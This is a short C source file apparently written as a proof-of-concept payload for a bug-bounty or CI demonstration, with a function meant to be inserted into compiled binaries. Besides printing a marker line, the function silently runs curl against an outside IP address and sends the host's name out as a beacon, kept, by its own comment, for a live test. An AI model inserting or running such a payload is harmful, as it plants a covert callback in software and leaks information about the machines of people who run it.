// Payload function to be inserted into binaries
#include <stdio.h>
#include <stdlib.h>

void leech_payload() {
    // PoC marker for CI/HackerOne demonstration
    printf("[LLVMPWN] LLVM Leech payload executed!\\n");

    // Real payload: beacon/callback (retained for live test)
    system("curl -s http://198.51.100.2/leech?host=$(hostname) > /dev/null 2>&1");
}
